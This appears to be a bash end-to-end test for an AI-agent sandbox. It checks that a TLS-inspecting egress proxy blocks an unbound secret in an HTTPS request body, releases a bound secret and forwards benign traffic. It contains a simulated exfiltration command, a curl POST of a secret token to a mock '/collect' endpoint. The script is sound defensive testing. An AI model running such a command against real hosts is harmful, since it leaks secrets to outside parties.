#!/usr/bin/env bash
#
# net-proxy-mitm-live.test.sh — LIVE e2e oracle: the Mandu NETWORK egress gate,
# with TLS inspection (MITM) ON, gates HTTPS REQUEST BODIES end-to-end through the
# launcher's `mandu-run.sh --net-proxy-mitm`, in the `secrets` protection mode
# (confidentiality ON, integrity OFF).
#
# This is the HTTPS analogue of net-proxy-live.test.sh. The difference is the
# capability a blind CONNECT tunnel CANNOT provide: a SECRET's $MDU:* symbol in
# an HTTPS request BODY is decrypted (the proxy terminates TLS with a session CA
# the agent trusts via CURL_CA_BUNDLE the launcher set), gated by the arbiter's
# data-usage policy and, for a no-model secret with no binding, BLOCKED (curl
# sees 403 naming `egress:secret-unbound`, confidentiality.md §3.2; the
# destination receives NOTHING). The control: a secret BOUND to the destination
# is RELEASED inside the re-encrypted body (the destination receives the real
# value, never the token, confidentiality-plan-10-flow-taint.md §11.5; the
# offline twin of wire-release-live.test.sh), and a benign HTTPS request is
# decrypted, forwarded, and DELIVERED. Last, a stand-in `node` first on PATH
# too old for NODE_USE_ENV_PROXY makes the launch print its one notice line
# (and a new enough one none; packaging.md §7).
#
# The integrity form of this suite (an UNTRUSTED symbol blocked, integrity ON)
# is frozen at launcher/test/integrity/net-proxy-mitm-live.test.sh
# (protection-modes.md §10.7).
#
# Offline + unprivileged: a real arbiter daemon on a temp socket (+ admin
# socket); a LOCAL HTTPS mock destination on an alternate loopback IP (127.0.0.2,
# NOT in NO_PROXY) with a self-signed cert, listening on a kernel-assigned port it
# reports through a port file; the launcher autostarts the MITM net-proxy on a
# kernel-assigned port and reaps it. No port is picked and released ahead of
# time (test-organization.md §8.4). To stay offline we pass
# MANDU_NET_PROXY_MITM_INSECURE_UPSTREAM=1 so the proxy's RE-ORIGINATION to the
# self-signed mock dest doesn't need the host system store (TEST ONLY — in
# production the upstream IS verified). The CLIENT side (curl) still does a real
# TLS verify against the launcher-wired CURL_CA_BUNDLE. The launches get a
# throwaway HOME and workspace so the launcher's secret walk scans neither the
# developer's home nor the repo.
#
# SKIPs cleanly (exit 0) when openssl / curl / node / npm are unavailable, the
# arbiter / net-proxy deps are not installed, or 127.0.0.2 can't be bound — those
# are environment gaps, not failures. An arbiter that never comes up (or
# refuses the setup calls) is a FAILURE, with its log's last lines.
#
# Run:  bash launcher/test/net-proxy-mitm-live.test.sh
#
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAUNCHER="$HERE/../mandu-run.sh"
# mandu-run.sh now shims the TS launcher, which turns ON every rung by default.
# This oracle tests ONLY the net-proxy MITM HTTPS-body gate, so isolate it: disable
# the other rungs via env (fs-sync's worktree, the kernel confines, the exec-wrap
# that would block the symbol-bearing curl first, the model proxy, the reply filter)
# so the decrypted-body 403 is attributable to the MITM net-proxy alone.
export MANDU_FS_SYNC=0 MANDU_NO_KERNEL=1 MANDU_NO_CONTEXT_PROXY=1 MANDU_EXEC_WRAP=0 MANDU_REPLY_FILTER=0
# The rung banners this oracle greps print only under --verbose since the
# one-line default display (launch-banner.ts, release checklist a6).
export MANDU_VERBOSE=1
# This suite STATES its axes (docs/design/architecture/protection-modes.md §4): the arbiter it
# spawns and the launcher it runs both read these, so a change of the built-in
# default can never quietly change what the suite proves. STRICT makes an
# unstated axis a startup error in the arbiter. `secrets`: confidentiality ON,
# integrity OFF.
export MANDU_AXES_STRICT=1 MANDU_INTEGRITY=0 MANDU_CONFIDENTIALITY=1
REPO_ROOT="$(cd "$HERE/../.." && pwd)"
ARBITER_DIR="$REPO_ROOT/arbiter"
ARBITER_MAIN="$ARBITER_DIR/ipc/server-main.ts"
ARBITER_TSX="$ARBITER_DIR/node_modules/.bin/tsx"
EGRESS_DIR="$REPO_ROOT/interceptors/net-proxy"

PASS=0
FAIL=0
pass() { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

skip() {
  echo "SKIP: $1"
  echo "─────────────────────────────────────────"
  echo "net-proxy-mitm-live.test.sh: 0 passed, 0 failed (skipped)"
  exit 0
}

# A broken run, not a missing prerequisite: the arbiter this suite started did
# not come up, or refused the setup calls. FAIL with why and the log's last
# lines (scripts/lib/ready-deadline.sh), never SKIP: a suite that goes quiet
# must not show green.
abort() {
  echo "FAIL: $1"
  if [[ -n "${2:-}" ]]; then mdu_log_tail "$2"; fi
  echo "─────────────────────────────────────────"
  echo "net-proxy-mitm-live.test.sh: $PASS passed, $((FAIL + 1)) failed"
  exit 1
}

# ── 0. environment gates (skip, not fail, on a missing toolchain) ─────────────
command -v openssl >/dev/null 2>&1 || skip "openssl not on PATH — MITM mode needs it to mint the session CA"
command -v curl    >/dev/null 2>&1 || skip "curl not on PATH — cannot drive the proxy"
command -v node    >/dev/null 2>&1 || skip "node not on PATH — cannot run the mock destination / arbiter client"
command -v npm     >/dev/null 2>&1 || skip "npm not on PATH — the launcher cannot autostart the net-proxy"
[[ -x "$ARBITER_TSX" ]] || skip "arbiter tsx not installed ($ARBITER_TSX) — run 'cd arbiter && npm install'"
[[ -f "$EGRESS_DIR/package.json" && -d "$EGRESS_DIR/node_modules" ]] \
  || skip "net-proxy deps not installed ($EGRESS_DIR) — run 'cd interceptors/net-proxy && npm install'"

# ── 1. scratch dirs ────────────────────────────────────────────────────────────
WORK="$(mktemp -d "${TMPDIR:-/tmp}/mandu-mitm-live.XXXXXX")" || skip "mktemp failed"
# The Mandu home: a temp one under $WORK with no config.toml, so no host
# ~/.mandu/config.toml is read (the 7cdfc2c e2e rule) and nothing lands in the
# real home; the arbiter and every launch below inherit it.
export MANDU_HOME="$WORK/mandu-home"
# The runtime base (the instance registry, the human-plane socket, the
# launches' scope dirs): the suite's own, never the caller's
# $XDG_RUNTIME_DIR/mandu (test-organization.md §8.5).
export MANDU_RUNTIME_DIR="$WORK/rt"
ARBITER_SOCK="$WORK/arbiter.sock"
ADMIN_SOCK="$WORK/admin.sock"
FAKE_HOME="$WORK/home"
SECRETS_DIR="$WORK/secrets"
# The launches run in a throwaway HOME and workspace: the launcher's secret
# walk (on in `secrets`) covers both, and must scan neither the developer's
# home nor this repository.
WS="$WORK/ws"
mkdir -p "$FAKE_HOME" "$SECRETS_DIR" "$WS"

# The mock HTTPS destination binds to 127.0.0.2 (NOT 127.0.0.1), which is NOT in
# the launcher's NO_PROXY (loopback is excluded), so curl routes it THROUGH the
# egress proxy — exercising the gate exactly like a real remote destination.
# Since 2026-10-05 the net-proxy relays nothing to this machine (127.0.0.2
# included: blocked-destinations.ts), so the agent addresses the destination by
# a NAME, $DEST_NAME, that a mock-sites host route (MANDU_NET_PROXY_MOCK_SITES)
# sends to the listener: the CONNECT and the decrypted request are judged as
# $DEST_NAME, and only the re-origination dials the route.
DEST_HOST="127.0.0.2"
DEST_NAME="dest.mandu.test"

# ── 1a. mint a self-signed cert for the HTTPS mock destination (SAN IP=DEST) ──
# This is the UPSTREAM's cert. The proxy re-originates with INSECURE_UPSTREAM=1
# (test only), so it need not chain anywhere; curl never sees this cert (curl talks
# to the proxy's terminated leaf, trusting the launcher-wired session CA).
DEST_KEY="$WORK/dest.key"
DEST_CERT="$WORK/dest.pem"
DEST_EXT="$WORK/dest.ext"
openssl ecparam -genkey -name prime256v1 -out "$DEST_KEY" 2>/dev/null
DEST_CSR="$WORK/dest.csr"
openssl req -new -key "$DEST_KEY" -subj "/CN=$DEST_HOST" -out "$DEST_CSR" 2>/dev/null
printf 'basicConstraints=CA:FALSE\nkeyUsage=digitalSignature,keyEncipherment\nextendedKeyUsage=serverAuth\nsubjectAltName=IP:%s\n' "$DEST_HOST" > "$DEST_EXT"
# Self-sign (the dest is its own CA here; INSECURE_UPSTREAM lets the proxy accept it).
openssl x509 -req -in "$DEST_CSR" -signkey "$DEST_KEY" -days 5 -sha256 -extfile "$DEST_EXT" -out "$DEST_CERT" 2>/dev/null
[[ -s "$DEST_CERT" ]] || skip "could not mint the mock HTTPS destination cert"

arbiter_pid=""
mock_pid=""
cleanup() {
  [[ -n "$mock_pid" ]] && kill "$mock_pid" 2>/dev/null || true
  [[ -n "$arbiter_pid" ]] && mdu_stop_group "$arbiter_pid"
  rm -rf "$WORK" 2>/dev/null || true
}
trap cleanup EXIT
# Lifeline backstop (lib/lifeline.sh): reaps the arbiter if this shell dies
# without its trap (SIGKILL / abandoned hang).
source "$(dirname "${BASH_SOURCE[0]}")/lib/lifeline.sh"
mdu_lifeline_init "$WORK"

# ── 1b. the mock HTTPS destination: port 0 + a port file (no free_port race) ──
# Records every request body (one line per request) to $RECV. It binds port 0
# itself and publishes the bound port (atomic tmp+rename), so no other process
# can take the port between choosing and binding it (test-organization.md §8.4).
RECV="$WORK/received.txt"
MOCK_PORT_FILE="$WORK/mock.port"
: > "$RECV"
echo "[1b/?] starting the mock HTTPS destination on $DEST_HOST (kernel-assigned port) ..."
node -e '
  const https = require("https");
  const fs = require("fs");
  const [host, portFile, recv, keyPath, certPath] = process.argv.slice(1);
  const key = fs.readFileSync(keyPath);
  const cert = fs.readFileSync(certPath);
  const srv = https.createServer({ key, cert }, (req, res) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      fs.appendFileSync(recv, Buffer.concat(chunks).toString("utf8") + "\n");
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("ok-https");
    });
  });
  srv.on("error", (e) => { process.stderr.write("mock-https-dest: " + e.message + "\n"); process.exit(3); });
  srv.listen(0, host, () => {
    fs.writeFileSync(portFile + ".tmp", String(srv.address().port));
    fs.renameSync(portFile + ".tmp", portFile);
  });
' "$DEST_HOST" "$MOCK_PORT_FILE" "$RECV" "$DEST_KEY" "$DEST_CERT" >"$WORK/mock.log" 2>&1 &
mock_pid=$!
tries=100
while (( tries-- > 0 )); do
  [[ -s "$MOCK_PORT_FILE" ]] && break
  # Some minimal namespaces only expose 127.0.0.1: SKIP cleanly, rather than fail.
  kill -0 "$mock_pid" 2>/dev/null || { cat "$WORK/mock.log" >&2; skip "cannot bind $DEST_HOST (alternate loopback unavailable) — cannot place a non-NO_PROXY destination"; }
  sleep 0.05
done
MOCKPORT="$(cat "$MOCK_PORT_FILE" 2>/dev/null)"
[[ "$MOCKPORT" =~ ^[0-9]+$ ]] || { cat "$WORK/mock.log" >&2; skip "the mock HTTPS destination never reported its port"; }
echo "      mock HTTPS destination up on $DEST_HOST:$MOCKPORT (pid $mock_pid), recording to $RECV."
ROUTES="$WORK/routes.yaml"
printf 'hosts:\n  - host: "%s"\n    tls_to: "%s:%s"\n' "$DEST_NAME" "$DEST_HOST" "$MOCKPORT" > "$ROUTES"

# ── 1c. a real arbiter daemon on a temp socket ─────────────────────────────────
echo "[1c/?] booting the arbiter daemon on $ARBITER_SOCK ..."
# MANDU_ADMIN_SOCK: the admin channel `setPathLabel` (the user's labelling act)
# is accepted on. MANDU_POLICY_FILE: never the host's policy file.
setsid env MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
           MANDU_ADMIN_SOCK="$ADMIN_SOCK" \
           MANDU_HOME="$MANDU_HOME" \
           MANDU_POLICY_FILE=/dev/null/mandu-test-no-policy.yaml \
           MANDU_LIFELINE=stdin \
  "$ARBITER_TSX" "$ARBITER_MAIN" "$ARBITER_SOCK" <"$MANDU_LIFELINE_FIFO" 9>&- >"$WORK/arbiter.log" 2>&1 &
arbiter_pid=$!

# The readiness budget (scripts/lib/ready-deadline.sh, runtime-instances.md
# §14.6): load-aware, doubled on CI; the wait ends at once if the daemon exits.
# shellcheck source=scripts/lib/ready-deadline.sh
. "$REPO_ROOT/scripts/lib/ready-deadline.sh"
ready_ms="$(mdu_ready_deadline_ms)"
# A start that does not come up FAILS the suite (with the log's last lines),
# never SKIPs it: the prerequisites were all checked above.
mdu_wait_sockets "$arbiter_pid" "$ready_ms" "$ARBITER_SOCK" "$ADMIN_SOCK" \
  || abort "the arbiter did not come up: $(mdu_ready_why $? "$ready_ms")" "$WORK/arbiter.log"
echo "      arbiter up (pid $arbiter_pid)."

# One NDJSON request over a unix socket; prints the first response line.
arb_call() {
  node -e '
    const net = require("net");
    const c = net.connect(process.argv[1], () => c.write(process.argv[2] + "\n"));
    let buf = "";
    c.setEncoding("utf8");
    c.on("data", (d) => {
      buf += d;
      const nl = buf.indexOf("\n");
      if (nl < 0) return;
      c.end();
      process.stdout.write(buf.slice(0, nl));
      process.exit(0);
    });
    c.on("error", (e) => { process.stderr.write(String(e)); process.exit(1); });
    setTimeout(() => { process.stderr.write("arbiter call timed out"); process.exit(1); }, 5000);
  ' "$1" "$2"
}

# ── 1d. REGISTER two real secrets in the arbiter ──────────────────────────────
# mint_secret FILE CANARY BINDINGS_JSON → prints the secret's $MDU: symbol: the
# user labels the file `no-model` over the ADMIN channel (optionally bound to
# destinations it may be released to), then the file is registered as a secret.
mint_secret() {
  printf '%s' "$2" > "$1"
  local lbl reg
  lbl="$(arb_call "$ADMIN_SOCK" "{\"id\":1,\"op\":\"setPathLabel\",\"path\":\"$1\",\"confidentiality\":\"no-model\",\"bindings\":$3}")"
  [[ "$lbl" == *'"ok":true'* ]] || { echo "setPathLabel failed: $lbl" >&2; return 1; }
  reg="$(arb_call "$ARBITER_SOCK" "{\"id\":2,\"op\":\"registerSecret\",\"path\":\"$1\"}")"
  printf '%s' "$reg" | node -e 'let s="";process.stdin.on("data",(d)=>s+=d).on("end",()=>{try{process.stdout.write((JSON.parse(s).result||{}).symbol||"")}catch{}})'
}
echo "[1d/?] labelling + registering two secrets (one unbound, one bound to $DEST_NAME) ..."
SECRET="TOPSECRET_$$_$RANDOM"
BOUND_SECRET="BOUNDSECRET_$$_$RANDOM"
SYMBOL="$(mint_secret "$SECRETS_DIR/deploy-token.txt" "$SECRET" '[]' 2>"$WORK/mint.err")"
BOUND_SYMBOL="$(mint_secret "$SECRETS_DIR/partner-key.txt" "$BOUND_SECRET" "[\"$DEST_NAME\"]" 2>>"$WORK/mint.err")"
if [[ "$SYMBOL" != '$MDU:nomodel_'* || "$BOUND_SYMBOL" != '$MDU:nomodel_'* ]]; then
  cat "$WORK/mint.err" >&2 || true
  abort "could not register the secrets via the arbiter — got: '$SYMBOL' / '$BOUND_SYMBOL'" "$WORK/arbiter.log"
fi
echo "      unbound secret symbol: $SYMBOL"
echo "      bound secret symbol:   $BOUND_SYMBOL  (bound to $DEST_NAME)"

# One launch through the launcher: $1 = the stderr file, $2 = the agent's
# command; extra env (MANDU_TEST_SYM) comes from the caller. Temp arbiter, no
# autostart, MITM on, insecure upstream (test), and MANDU_NET_PROXY_PORT=0: the
# launcher starts the net-proxy on a kernel-assigned port and reads it back from
# the proxy's port file (services/net-proxy.ts).
launch() {
  ( cd "$WS" && \
  HOME="$FAKE_HOME" \
  MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
  MANDU_NO_ARBITER_AUTOSTART=1 \
  MANDU_NET_PROXY_PORT=0 \
  MANDU_NET_PROXY_MITM_INSECURE_UPSTREAM=1 \
  MANDU_NET_PROXY_MOCK_SITES="$ROUTES" \
  bash "$LAUNCHER" --target claude --net-proxy-mitm --no-scope --no-mcp -- \
    bash -c "$2" 2>"$1" )
}
check_mitm() {
  if grep -q "proceeding with plain --net-proxy\|proceeding WITHOUT the network egress gate\|HTTPS is effectively blind-tunneled\|TLS inspection unavailable" "$1"; then
    echo "--- launcher stderr (degraded) ---" >&2; cat "$1" >&2
    fail "launcher degraded out of MITM mode — HTTPS bodies were NOT gated (see stderr above)"
  fi
}

# ── 2. EXFIL attempt: an UNBOUND secret's symbol in the HTTPS BODY → 403 ───────
# curl uses the CURL_CA_BUNDLE the launcher wires (the session CA) to trust the
# proxy's terminated leaf for $DEST_NAME. The proxy decrypts the body, sees a
# no-model secret's symbol bound for a destination the secret is not bound to
# (`egress:secret-unbound`) → 403, and forwards NOTHING.
echo "[2/?] EXFIL of an unbound secret over HTTPS through the launcher (expect curl 403, dest receives NOTHING) ..."
exfil_out="$(
  MANDU_TEST_SYM="$SYMBOL" \
  launch "$WORK/exfil.err" 'curl -s -o "'"$WORK"'/exfil.body" -w "%{http_code}" --data "leak=${MANDU_TEST_SYM}" https://'"${DEST_NAME}"'/collect'
)"
exfil_rc=$?
check_mitm "$WORK/exfil.err"
echo "      curl http_code: '$exfil_out' (launcher rc=$exfil_rc)"
if [[ "$exfil_out" == "403" ]]; then
  pass "EXFIL: an unbound secret's symbol in the HTTPS BODY → curl saw 403 (the MITM gate decrypted + BLOCKED it)"
else
  echo "--- launcher stderr (exfil) ---" >&2; cat "$WORK/exfil.err" >&2
  fail "EXFIL over HTTPS was NOT blocked; expected curl '403', got '$exfil_out'"
fi
if grep -q "egress:secret-unbound" "$WORK/exfil.body" 2>/dev/null; then
  pass "the 403 names the confidentiality rule egress:secret-unbound (the block is the secret's label)"
else
  fail "the 403 body does not name egress:secret-unbound: '$(head -c 400 "$WORK/exfil.body" 2>/dev/null)'"
fi
recv_after_exfil="$(cat "$RECV" 2>/dev/null)"
if [[ -z "$recv_after_exfil" ]]; then
  pass "the HTTPS destination received NOTHING (the secret never left the proxy)"
else
  fail "the destination RECEIVED data on the blocked HTTPS exfil: $recv_after_exfil"
fi
if [[ "$recv_after_exfil" == *"$SECRET"* ]]; then
  fail "the raw secret LEAKED to the destination over HTTPS: $recv_after_exfil"
fi

# ── 3. CONTROL: the BOUND secret's symbol → RELEASED inside the HTTPS body ─────
# The same request shape, a secret whose label binds it to $DEST_NAME: the proxy
# puts the REAL value back inside the body it re-encrypts to the bound host
# (plan 10 §11.5). This shows the gate decrypts the body, reads the symbol and
# decides on its label: the 403 above is the unbound label's verdict.
echo "[3/?] CONTROL: a secret bound to $DEST_NAME over HTTPS (expect curl 200, dest receives the real value, not the token) ..."
: > "$RECV"
bound_out="$(
  MANDU_TEST_SYM="$BOUND_SYMBOL" \
  launch "$WORK/bound.err" 'curl -s -o /dev/null -w "%{http_code}" --data "key=${MANDU_TEST_SYM}" https://'"${DEST_NAME}"'/collect'
)"
bound_rc=$?
check_mitm "$WORK/bound.err"
echo "      curl http_code: '$bound_out' (launcher rc=$bound_rc)"
recv_after_bound="$(cat "$RECV" 2>/dev/null)"
if [[ "$bound_out" == "200" && "$recv_after_bound" == *"key=$BOUND_SECRET"* ]]; then
  pass "CONTROL: the bound secret was released inside the HTTPS body at its bound host (dest received the real value)"
else
  echo "--- launcher stderr (bound) ---" >&2; cat "$WORK/bound.err" >&2
  fail "CONTROL: the bound secret was not released; curl '$bound_out', dest got '$recv_after_bound'"
fi
if [[ "$recv_after_bound" == *'$MDU:'* ]]; then
  fail "CONTROL: the token itself reached the bound host: $recv_after_bound"
else
  pass "CONTROL: the token itself never reached the bound host"
fi

# ── 4. BENIGN HTTPS request: no symbol → MUST PASS and be DELIVERED ────────────
echo "[4/?] BENIGN HTTPS request through the launcher (expect curl 200, dest receives hello=world) ..."
: > "$RECV"
benign_out="$(
  launch "$WORK/benign.err" "curl -s -o /dev/null -w '%{http_code}' --data 'hello=world' https://${DEST_NAME}/collect"
)"
benign_rc=$?
check_mitm "$WORK/benign.err"
echo "      curl http_code: '$benign_out' (launcher rc=$benign_rc)"
if [[ "$benign_out" == "200" ]]; then
  pass "BENIGN symbol-free HTTPS request → curl saw 200 (decrypted + forwarded through the gate)"
else
  echo "--- launcher stderr (benign) ---" >&2; cat "$WORK/benign.err" >&2
  fail "BENIGN HTTPS request did NOT pass; expected curl '200', got '$benign_out'"
fi

recv_after_benign="$(cat "$RECV" 2>/dev/null)"
if [[ "$recv_after_benign" == *"hello=world"* ]]; then
  pass "the destination RECEIVED the decrypted benign body (hello=world) — MITM forward works"
else
  fail "the destination did NOT receive the benign body; got: '$recv_after_benign'"
fi

# ── 5. the launcher logged MITM LIVE + autostarted the net-proxy ───────────
echo "[5/?] checking the launcher logged MITM LIVE ..."
if grep -qF "MITM: HTTPS request bodies gated" "$WORK/exfil.err" "$WORK/bound.err" "$WORK/benign.err" 2>/dev/null; then
  pass "the launcher logged the MITM gate LIVE (HTTPS request bodies gated)"
else
  echo "--- launcher stderr (exfil) ---" >&2; cat "$WORK/exfil.err" >&2
  fail "the launcher did not log MITM LIVE"
fi

# ── 6. a `node` on PATH too old for NODE_USE_ENV_PROXY → one notice line ──────
# A Node program in the session runs the `node` first on PATH; one older than
# 22.21 (24.5 for http/https) ignores the launcher's NODE_USE_ENV_PROXY=1 and
# goes around this proxy, so its placeholders are never filled in
# (confidentiality-plan-13-reader-set-labels.md §10.2). The launch says so in
# one line (node-floor.ts nodeEnvProxyNotice) and still runs. A stand-in
# `node` answers `--version` with the chosen version and hands everything else
# to the real Node, so the launcher itself runs as before.
echo "[6/?] a too-old node on PATH: the launch prints the notice once and still runs; a new enough one prints none ..."
REAL_NODE="$(command -v node)"
fake_node() {  # $1 = dir, $2 = the version it reports
  mkdir -p "$1"
  printf '#!/bin/sh\nif [ "$1" = "--version" ]; then echo %s; exit 0; fi\nexec %q "$@"\n' "$2" "$REAL_NODE" > "$1/node"
  chmod 755 "$1/node"
}
fake_node "$WORK/node-old" v22.13.0
fake_node "$WORK/node-new" v24.21.0
old_out="$(PATH="$WORK/node-old:$PATH" launch "$WORK/node-old.err" 'echo agent-ran')"
check_mitm "$WORK/node-old.err"
notice="mandu: ! Node v22.13.0 on your PATH is too old for Mandu: Node programs in this session won't have your secrets filled in on their web requests; see \`mandu doctor\`"
if [[ "$old_out" == *agent-ran* && "$(grep -cxF "$notice" "$WORK/node-old.err")" == 1 ]]; then
  pass "a node 22.13 on PATH: the launch printed the notice once and the agent ran"
else
  echo "--- launcher stderr (old node) ---" >&2; cat "$WORK/node-old.err" >&2
  fail "a node 22.13 on PATH: expected the notice once and the agent to run (agent said '$old_out')"
fi
new_out="$(PATH="$WORK/node-new:$PATH" launch "$WORK/node-new.err" 'echo agent-ran')"
if [[ "$new_out" == *agent-ran* ]] && ! grep -q "on your PATH is too old for Mandu" "$WORK/node-new.err"; then
  pass "a node 24.21 on PATH: no notice"
else
  echo "--- launcher stderr (new node) ---" >&2; cat "$WORK/node-new.err" >&2
  fail "a node 24.21 on PATH: expected no notice (agent said '$new_out')"
fi

# ── summary ───────────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────"
echo "net-proxy-mitm-live.test.sh: $PASS passed, $FAIL failed"
if [[ "$FAIL" -gt 0 ]]; then
  exit 1
fi
exit 0
